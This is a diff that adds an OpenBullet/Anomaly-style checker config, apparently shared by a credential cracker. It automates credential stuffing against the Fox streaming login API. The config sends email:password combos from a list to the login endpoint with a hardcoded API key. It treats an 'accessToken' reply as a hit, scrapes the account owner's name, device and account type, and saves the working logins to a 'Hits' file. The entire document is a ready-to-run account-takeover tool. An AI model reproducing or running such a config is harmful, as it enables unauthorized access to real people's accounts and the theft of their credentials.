@@ -1,0 +1,81 @@
+[SETTINGS]
+{
+  "Name": "FOX ⛧𝓐𝓼𝓽𝓪𝓻𝓸𝓽𝓱⛧",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-04-07T20:03:27.6058715-05:00",
+  "AdditionalInfo": "",
+  "Author": "@Astaroth_66",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#@astaroth_66 REQUEST POST "https://api3.fox.com/v2.0//login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.fox.com" 
+  HEADER "referer: https://www.fox.com/" 
+  HEADER "x-api-key: 6E9S4bmcoNnZwVLOHywOv8PJEdu76cM9" 
+
+#@astaroth_66 KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials" 
+  KEYCHAIN Success OR 
+    KEY "accessToken" 
+
+#@astaroth_66 PARSE "<SOURCE>" LR "platform\":\"" "\"," CreateEmpty=FALSE -> CAP "plataforma" 
+
+#@astaroth_66 PARSE "<SOURCE>" LR "device\":\"" "\"," CreateEmpty=FALSE -> CAP "device" 
+
+#@astaroth_66 PARSE "<SOURCE>" LR "firstName\":\"" "\"," CreateEmpty=FALSE -> CAP "nombre" 
+
+#@astaroth_66 PARSE "<SOURCE>" LR "email\":\"" "\"," -> VAR "email" 
+
+#@astaroth_66 PARSE "<SOURCE>" LR "accountType\":\"" "\"," -> VAR "type" 
+
+#@astaroth_66 FUNCTION Constant "⛧𝓐𝓼𝓽𝓪𝓻𝓸𝓽𝓱⛧" -> CAP "Config By:" 
+
+#@astaroth_66 UTILITY File "Hits Fox By:Astaroth.txt" AppendLines "╔══════════════════════\\n╟ ● Fox Premium Hits\\n╠ » Email: <USER>\\n╠ » Password: <PASS>\\n╠ » Combo: <USER>:<PASS> \\n╟ ● Config By: ⛧𝓐𝓼𝓽𝓪𝓻𝓸𝓽𝓱⛧\\n╚══════════════════════\\n" -> VAR "HITS " 
+
